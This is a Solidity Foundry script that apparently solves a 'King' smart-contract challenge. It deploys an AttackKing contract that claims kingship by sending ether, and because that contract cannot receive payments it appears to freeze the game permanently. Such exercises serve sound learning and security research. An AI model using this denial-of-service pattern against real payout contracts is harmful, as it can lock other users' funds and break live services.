// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {King} from "../src/King.sol";

contract KingScript is Script {
    King public king;
    AttackKing public attackKing;

    function run() external {
        king = King(payable(0x27EED384fe5f12aDf320D21c0a2283451bcfC532));
        attack();
    }

    function attack() public {
        vm.startBroadcast();

        attackKing = new AttackKing();
        attackKing.fund{value: 0.001 ether}();
        attackKing.changeKing();

        vm.stopBroadcast();
    }
}

contract AttackKing {
    King public king;

    constructor() {
        king = King(payable(0x27EED384fe5f12aDf320D21c0a2283451bcfC532));
    }

    function fund() public payable {}

    function changeKing() public {
        (bool success,) = address(king).call{value: 0.001 ether}("");
        require(success, "AttackKing:changeKing() transaction failed");
    }
}
